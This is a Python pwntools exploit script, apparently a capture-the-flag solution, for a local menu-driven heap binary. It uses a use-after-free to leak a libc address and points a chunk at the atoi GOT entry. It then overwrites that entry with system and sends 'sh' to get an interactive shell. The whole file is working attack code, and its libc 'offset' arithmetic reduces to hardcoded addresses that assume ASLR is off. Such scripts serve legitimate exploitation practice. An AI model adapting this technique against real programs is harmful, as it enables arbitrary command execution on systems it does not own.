from pwn import *

atoi_got = 0x6032D8

def add(name, attack = 1, 
          defense = 1, speed = 1, precision = 1):

    p.recvuntil('choice: ')
    p.sendline('1')

    p.recvuntil('name: ')
    p.sendline(name)

    p.recvuntil('points: ')
    p.sendline(str(attack))

    p.recvuntil('points: ')
    p.sendline(str(defense))

    p.recvuntil('speed: ')
    p.sendline(str(speed))

    p.recvuntil('precision: ')
    p.sendline(str(precision))

    return

def edit(name):

    p.recvuntil('choice: ')
    p.sendline('4')

    p.recvuntil('choice: ')
    p.sendline('1')

    p.recvuntil('name: ')
    p.sendline(name)

    p.recvuntil('choice: ')
    p.sendline('sh')

    return

def select(i):

    p.recvuntil('choice: ')
    p.sendline('3')

    p.recvuntil('index: ')
    p.sendline(str(i))

    return

def free(i):

    p.recvuntil('choice: ')
    p.sendline('2')

    p.recvuntil('index: ')
    p.sendline(str(i))

    return

def show():

    p.recvuntil('choice: ')
    p.sendline('5')

    return

def pwn():

    add('A'*0x60)
    add('B'*0x60)
    add('C'*0x80)
    add('D'*0x80)

    select(2)

    free(2)

    show()

    p.recvuntil('Name: ')

    leak       = u64(p.recv(6).ljust(8, '\x00'))
    #leak        = 0x00007ffff7dd1b78
    offset = leak - 0x7ffff7a0d000
    # libc base --> 0x7ffff7a0d000
    libc        = leak - offset
    # system --> 0x7ffff7a52390
    system_offset = libc - 0x7ffff7a52390
    system      = libc - system_offset

    log.info("Leak: 0x{:x}".format(leak))
    log.info("Libc: 0x{:x}".format(libc))
    log.info("System: 0x{:x}".format(system))

    free(3) 

    add('Z'*8 * 2 + p64(atoi_got))

    edit(p64(system))

    p.interactive()

if __name__ == "__main__":
    p = process("./new_main.elf")
    pwn()

